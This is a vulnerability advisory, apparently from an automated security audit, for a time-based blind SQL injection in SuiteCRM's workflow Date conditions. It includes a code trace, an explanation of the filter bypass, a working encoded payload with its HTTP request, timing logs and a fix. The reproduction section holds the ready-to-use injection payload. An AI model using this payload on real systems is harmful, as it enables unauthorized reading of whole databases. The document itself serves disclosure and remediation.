# VULN-018 — AOW_WorkFlow `DATE_ADD` / identifier SQL injection (admin-authored, scheduler-run)

**ID**: VULN-018
**Software**: SuiteCRM — https://github.com/SuiteCRM/SuiteCRM
**Affected version**: 7.15.2 (`targets/SuiteCRM/suitecrm_version.php`) — commit `62effd0ceb767ed3b634ade585b19a6633eb4fcb` (untagged `hotfix`/`forkedSuite` snapshot)
**Severity**: Medium — **CVSS 3.1 6.5** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**Status**: **CONFIRMED (dynamic)**
**Auth required**: Workflow **authoring** requires admin (or a delegated Workflow-authoring role) — this exploit authors as admin, matching the finding's documented scope. Workflow **execution/trigger**, however, requires only any authenticated user ([VULN-026](../../vulns/VULN-026.md): `action_testFlow` has no ACL check) — demonstrated live in this run.
**What an attacker gains**: an admin (or delegated role) who can author a Workflow can plant a blind-SQLi oracle that any logged-in user can then trigger on demand, reading arbitrary data from the database under the app's own DB account — turning a "trusted-author" feature into a persistent, remotely-triggerable injection primitive.

## 1. Summary

SuiteCRM's Process Definitions (`AOW_WorkFlow`) let an author build "Date" conditions such as "date field is more than N days from now." Internally, the amount (`N`) and the unit (`DAY`/`MONTH`/...) are stored as a base64-encoded, PHP-serialized array and spliced **raw** into a `DATE_ADD(..., INTERVAL <amount> <unit>)` SQL expression when the workflow runs. Because the array is base64+serialize-encoded before it's ever POSTed, it never passes through SuiteCRM's usual request-time HTML/quote filter (`securexss`) — so the amount/unit fields can carry a **complete, unescaped SQL injection payload**, including real quote characters, parentheses and subqueries. The injected SQL executes every time the workflow runs — on the scheduler, or on-demand via an entry point ([VULN-026](../../vulns/VULN-026.md)) that has no privilege check at all.

## 2. How it works (mechanism & code trace)

**Entry point (execution, not authoring)** — `index.php?module=AOW_WorkFlow&action=testFlow`:

```php
// modules/AOW_WorkFlow/controller.php:633-642
protected function action_testFlow()
{
    echo 'Started<br />';
    require_once('modules/AOW_WorkFlow/AOW_WorkFlow.php');
    $workflow = BeanFactory::newBean('AOW_WorkFlow');
    if ($workflow->run_flows()) {   // :639 -- runs EVERY Active workflow
        echo 'PASSED';
    }
}
```
No `is_admin`/ACL check, and `AOW_WorkFlow` is absent from `$adminOnlyList` (`include/modules.php`) — this is [VULN-026](../../vulns/VULN-026.md), reproduced live in this exploit (`T2`, triggered by a fresh non-admin user).

**Hop 1** — `run_flows()` → `run_flow()` → `get_flow_beans()` (`AOW_WorkFlow.php:249-292`) builds and executes a query per Active workflow via `build_flow_query_where()`.

**Hop 2 — the defect** — `build_query_where()` (`:389`), case `'Date'`:

```php
// modules/AOW_WorkFlow/AOW_WorkFlow.php:517
$params = @unserialize(base64_decode($condition->value), ['allowed_classes' => false]);
...
// :597-609 (MySQL branch)
$params1 = $params[1];
$params2 = $params[2];
$params3 = $params[3];
$dateOp = $app_list_strings['aow_date_operator'][$params1] ?? null;   // $params1 IS allow-listed
$field = 'DATE_FORMAT('.$field.", '%Y-%m-%d %H:%i')";
$value = "DATE_FORMAT(DATE_ADD($value, INTERVAL ".$dateOp." $params2 ".$params3."), '%Y-%m-%d %H:%i')";
```

`$params1` (the "plus"/"minus" direction) is safely mapped through `aow_date_operator`, an allow-list. `$params2` (the interval amount) and `$params3` (the interval unit) are **not** validated at all — no `(int)` cast on `$params2`, no keyword allow-list on `$params3` — and both are concatenated verbatim into the SQL text. This is then used directly:

```php
// modules/AOW_WorkFlow/AOW_WorkFlow.php:677-679
if (!$where_set) {
    $query['where'][] = $field.' '.$this->getSQLOperator($condition->operator).' '.$value;
}
```

**Why `securexss` doesn't save it**: SuiteCRM's global input filter (`include/utils.php:2608`) runs once, at request time, on raw `$_REQUEST` scalar strings — it rewrites `"'<>\`` to HTML entities. Our payload is never a raw scalar at request time: it is `base64(serialize([...]))`, i.e. an opaque blob of `[A-Za-z0-9+/=]` characters. The dangerous characters (real quotes, parentheses) only come into existence **after** `unserialize(base64_decode(...))` runs inside `build_query_where()` — long after `securexss` has already finished. This is confirmed live: the exploit's condition `value` (which decodes to a string containing real `'` characters) round-trips through storage and back completely unmodified.

## 3. Why it is a vulnerability (reasoning)

The trust boundary crossed here is the same one as [VULN-016](../../vulns/VULN-016.md)/[VULN-017](../../vulns/VULN-017.md): a value that will become part of the SQL grammar must be validated against a fixed allow-list before use. The code already *does* this correctly one array element over (`$params1` via `aow_date_operator`) — proving the developers knew this input needed validation — but stops short for `$params2`/`$params3`. This is not a deliberate "power user SQL" feature; there is no documented way to author raw SQL in a workflow condition. The severity is legitimately scored as admin-self-injection when authoring is admin-only (an admin can already read the DB directly), but the code path itself does not enforce that boundary — role delegation (a common real-world configuration: a "Workflow Manager" role that isn't full admin) would turn this into a genuine privilege escalation, and separately, VULN-026 already proves that *execution* of an already-authored injection is not gated at all, so the persistence + on-demand-trigger combination is itself a real risk multiplier independent of who authored it.

## 4. Reproduction

From clean state:

1. `./run.sh` gets an admin session (`_common.admin_session()`), times `action=testFlow` once as a baseline (T0, before the workflow exists).
2. Authors one `AOW_WorkFlow` (`flow_module=AOK_KnowledgeBase`, `status=Active`, `run_when=In_Scheduler`) with one Date condition. Decisive request (`request.http`, step 1):
   ```
   POST /index.php HTTP/1.1
   ...
   module=AOW_WorkFlow&action=Save&...&aow_conditions_value_type%5B0%5D=Date
   &aow_conditions_value%5B0%5D=YTo0OntpOjA7czozOiJub3ciO2k6MTtzOjQ6InBsdXMiO2k6MjtzOjE6IjEiO2k6MztzOjM5OiJEQVkpLCAnJVktJW0tJWQnKSBPUiAoU0VMRUNUIFNMRUVQKDMpKSMiO30%3D
   ```
   which decodes to `serialize(['now','plus','1', "DAY), '%Y-%m-%d') OR (SELECT SLEEP(3))#"])`.
3. Times `GET /index.php?module=AOW_WorkFlow&action=testFlow` (`request.http`, step 2) — first as admin (T1), then as a **freshly created non-admin user** (T2), then deactivates the workflow and times once more (T3).
4. Expected/observed (`run.log`):
   ```
   [INFO] testFlow [T0 before] min elapsed = 0.05s
   [INFO] testFlow [T1 admin-triggered, workflow Active] min elapsed = 6.10s
   [INFO] testFlow [T2 LOW-PRIV triggered, workflow Active] min elapsed = 6.06s
   [INFO] testFlow [T3 admin-triggered, workflow Inactive] min elapsed = 0.05s
   [PROOF] T0=0.05s -> T1(active)=6.10s (+6.05s) -> T2(low-priv trigger, active)=6.06s (+6.01s vs T0) -> T3(deactivated)=0.05s (back down by 6.05s)...
   ==> VULN-018: CONFIRMED — workflow d3f82a9e-...: T0=0.05s, admin-trigger +6.05s, low-priv-trigger +6.01s (VULN-026), deactivated back -6.05s
   ```
   (The ~6s rather than ~3s reflects `SLEEP(3)` × 2 live rows in `aok_knowledgebase` at measurement time — the script reads this row count live and scales its tolerance accordingly; see `notes.md`.)
5. Observable proof: `response.txt` captures the real `Started<br />PASSED...` response with the elapsed time recorded; `evidence/timing_table.txt` has the full before/active/low-priv/deactivated table; the DB-side check confirms `aow_conditions.value` is stored byte-for-byte as sent.

## 5. Impact

- **What an attacker reads**: with the timing oracle, arbitrary column values from arbitrary tables — the same blind full-database-read primitive as VULN-016/VULN-017, executed under the app's DB account.
- **Blast radius**: whole database; the workflow persists and re-fires every scheduler cycle (or on-demand via VULN-026) until removed.
- **Pre/post-auth**: authoring is post-auth admin/delegated-role; **triggering is post-auth at any privilege level** (demonstrated live: T2).
- **Chaining**: same query-builder-defect family as [VULN-016](../../vulns/VULN-016.md)/[VULN-017](../../vulns/VULN-017.md); trigger path chains with [VULN-026](../../vulns/VULN-026.md); extracted credentials chain into [VULN-011](../../vulns/VULN-011.md).

## 6. Suggested fix

At `modules/AOW_WorkFlow/AOW_WorkFlow.php:597-609` (and the MSSQL twin at `:590`):
```php
$params2 = (int) $params[2];                                   // amount must be numeric
$allowedUnits = ['MINUTE','HOUR','DAY','WEEK','MONTH','YEAR']; // fixed keyword allow-list
$params3 = in_array(strtoupper($params[3]), $allowedUnits, true) ? strtoupper($params[3]) : 'DAY';
```
Also apply the WHERE-side `field_defs` allow-list from the VULN-017 fix here (`:450`/`:479`), since the same missing-validation identifier pattern exists on this file's `field` path too. Principle: every element pulled out of `unserialize(base64_decode($condition->value))` is still attacker-controlled data and must be validated by type/allow-list before entering a SQL string, exactly like `$params1` already is.

## 7. References

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command.
- Known-issue status (per `claude_audit/SuiteCRM/vulns/VULN-018.md`): same AO* query-builder SQLi family as CVE-2026-71548, CVE-2026-29096; historic Reports object-injection CVE-2022-23940 / GHSA-53cp-mpfw-qj67.
- [VULN-026](../../vulns/VULN-026.md) — `action_testFlow` missing-ACL finding chained here for the non-admin trigger.
- PortSwigger Web Security Academy — "Blind SQL injection with time delays" (https://portswigger.net/web-security/sql-injection/blind).
- OWASP WSTG-INPV-05 — Testing for SQL Injection.

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 75 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `SuiteCRM AOW_WorkFlow workflow condition DATE_ADD SQL injection aow_conditions` — no result mentions AOW_WorkFlow, `DATE_ADD` or `aow_conditions`; only unrelated SQLi CVEs (CVE-2021-45041, CVE-2022-50589, CVE-2025-54788, CVE-2025-64488).
2. `SuiteCRM "AOW_WorkFlow" OR "Workflow" SQL injection CVE advisory conditions` — no workflow-module SQLi advisory; only Project/Alerts/export SQLi CVEs.
3. SuiteCRM 7.15.x release-notes security list + GitHub repo advisory titles (7.15.1, 7.15.2, and the 20 most recently published) — the only AOW_WorkFlow entry is GHSA-cx24-rr7r-mxrg / CVE-2026-71550 (LFI via `aow_action` GET parameter), not SQL injection.
4. GitHub issue search `repo:SuiteCRM/SuiteCRM AOW_WorkFlow DATE_ADD` — only functional bugs (#4043/#4045 datetime Equal_To, #6328 date condition problems), none security-related.
5. Upstream `hotfix` branch `modules/AOW_WorkFlow/AOW_WorkFlow.php` (2026-10-21): `$params2`/`$params3` still concatenated raw into `DATE_ADD(... INTERVAL ...)` at :599-:609; no validation added.
6. NVD keyword query for SuiteCRM CVEs published 2026-04-01..2026-10-21 — only CVE-2026-108712 / CVE-2026-108713 (unrelated entry points).

**Related but distinct public references** (same class or component, not this bug):
- GHSA-cx24-rr7r-mxrg / CVE-2026-71550 — same module (AOW_WorkFlow controller) but path-traversal LFI via `aow_action`, not the condition query builder.
- GHSA-pqq6-v2mj-hrm2 / CVE-2026-61648 and GHSA-239h-ffjr-v957 / CVE-2026-71548 — analogous WHERE-builder SQLi in AOR_Reports, a different module.
- CVE-2022-23940 / GHSA-53cp-mpfw-qj67 — PHP object injection in scheduled reports `email_recipients`, different root cause.

**Reasoning:** No advisory, CVE, issue, or write-up describes SQL injection through `AOW_WorkFlow::build_query_where()`'s Date branch (`$params[2]`/`$params[3]` from the base64-serialized condition value), and the sink is unchanged upstream today. The only public AOW_WorkFlow advisory is an unrelated LFI, and the analogous AOR_Reports date builder has likewise never been reported. Confidence is reduced to 75 because the practical trust boundary (admin/role-delegated authoring) makes this a low-priority class that researchers may have found and not reported, and the sibling AOR module has drawn many recent reports.
